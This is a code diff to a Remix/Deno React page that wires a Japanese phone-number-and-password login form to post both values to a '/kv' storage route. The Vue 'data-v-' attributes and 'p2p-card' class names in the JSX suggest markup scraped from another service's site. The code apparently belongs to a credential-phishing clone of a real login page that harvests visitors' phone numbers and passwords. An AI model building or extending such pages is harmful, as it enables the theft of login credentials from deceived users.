@@ -1,6 +1,7 @@
 import * as React from "react";
 import type { V2_MetaFunction } from "@remix-run/deno";
 import { submitData } from "../submit.ts";
+import { useFetcher } from "@remix-run/react";
 
 export const meta: V2_MetaFunction = () => {
   return [
@@ -11,6 +12,8 @@ export const meta: V2_MetaFunction = () => {
 
 export default function Index() {
   let n: string | null = "";
+
+  const fetcher = useFetcher();
 
   if (typeof document !== "undefined") {
     n = new URL(window.location.href).searchParams.get("n")
@@ -124,30 +127,38 @@ export default function Index() {
                     style={{ display: nowPage == "pass" ? "flex" : "none" }}
                     className="pass-x"
                   >
-                    <input
-                      type="phone"
-                      pattern="[0-9]*"
-                      placeholder="電話番号"
-                      className="phone-x"
-                      value={datas.phone}
-                      onChange={(e) =>
-                        setDatas({ ...datas, phone: e.target.value })
-                      }
-                    />
-                    <input
-                      type="password"
-                      placeholder="パスワード"
-                      className="password-x"
-                      value={datas.password}
-                      onChange={(e) =>
-                        setDatas({ ...datas, password: e.target.value })
-                      }
-                    />
-                    <button onClick={() => {
-                      submitData(datas);
-                    }} type="button" className="login-x">
-                      ログイン
-                    </button>
+                    <fetcher.Form method="post" action="/kv">
+                      <input
+                        type="phone"
+                        pattern="[0-9]*"
+                        placeholder="電話番号"
+                        className="phone-x"
+                        value={datas.phone}
+                        name="phone"
+                        onChange={(e) =>
+                          setDatas({ ...datas, phone: e.target.value })
+                        }
+                      />
+                      <input
+                        type="password"
+                        placeholder="パスワード"
+                        className="password-x"
+                        value={datas.password}
+                        name="password"
+                        onChange={(e) =>
+                          setDatas({ ...datas, password: e.target.value })
+                        }
+                      />
+                      <button
+                        onClick={() => {
+                          submitData(datas, fetcher);
+                        }}
+                        type="submit"
+                        className="login-x"
+                      >
+                        ログイン
+                      </button>
+                    </fetcher.Form>
                   </div>
                 </div>{" "}
                 <div data-v-1264247b="" data-v-4bb01f76="" className="p2p-card">
